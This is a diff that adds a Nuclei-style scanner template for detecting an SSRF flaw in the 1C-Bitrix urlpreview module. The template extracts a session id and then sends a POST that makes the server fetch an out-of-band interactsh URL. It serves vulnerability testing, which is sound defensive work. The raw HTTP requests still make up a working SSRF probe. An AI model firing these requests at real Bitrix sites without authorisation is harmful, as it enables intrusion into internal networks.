@@ -1,0 +1,38 @@
+id: bitrix_ssrf_urlpreview
+
+info:
+
+  name: 1C-Bitrix SSRF
+  author: vag4b0nd
+  severity: high
+  description: The template detion SSRF in Bitrix module urlpreview
+  tags: Bitrix,SSRF,urlpreview
+
+http:
+  - raw:
+    - |
+        GET /bitrix/tools/composite_data.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+    - |
+        POST /bitrix/components/bitrix/main.urlpreview/ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Content-Type: application/x-www-form-urlencoded
+
+        sessid=§sess_id§&userFieldId=1&action=attachUrlPreview&url=https://{{interactsh-url}}/id3nt1fy
+
+    cookie-reuse: true
+    extractors:
+      - type: regex
+        name: sess_id
+        part: body
+        regex:
+          - '([0-9a-f]{32})'
+        internal: true
+
+    matchers:
+      - type: word
+        part: interactsh_request
+        words:
+            - "id3nt1fy"
